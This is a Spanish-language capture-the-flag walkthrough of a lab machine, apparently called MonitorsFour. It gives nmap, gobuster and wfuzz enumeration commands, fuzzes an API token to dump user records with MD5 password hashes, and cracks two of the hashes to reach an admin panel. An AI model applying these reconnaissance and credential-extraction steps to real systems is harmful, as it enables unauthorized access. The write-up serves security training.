### Reconocimiento
`nmap -p- --open --min-rate 5000 -sSCV -n -Pn -vvv 10.10.11.98 -oG allPorts`

```ad-hint
sales@monitorsfour.htb
```

```ad-note
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


`whatweb http://monitorsfour.htb/`

`gobuster dir -u http://monitorsfour.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt`

```ad-note
/contact            
/login              
/user               
/static             
/views              
/forgot-password    
```

También podemos buscar los subdominios existente
`wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "host:FUZZ.monitorsfour.htb" -u http://monitorsfour.htb --hh 138 -t 100`

Encontramos un subdominio llamado `http://cacti.monitorsfour.htb/cacti/`

En `/user` vemos que nos devuelve un error de misisng token pasamos la petición por burpsuite y probamos con diferentes valores de token en el intruder

```ad-hint
{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"1322606d50d1e96564","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},

{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},

{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},

{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"},

{"id":10,"username":"telmat","email":"telmat@telmat.fr","password":"8863b0433fa37ae767028c9c7125efdc","role":"admin","token":"7df1081449b6b98cc5","name":"telmat","position":"test","dob":"2020-12-12","start_date":"2020-12-12","salary":"0.35"}]
```

Pasamos los hashes por crackstation

```ad-hint
admin::wonderful1
telmat::telmat
```

También podemos usar hashcat

En el panel de login usamos las credenciales obtenidas y podemos acceder al panel de admin


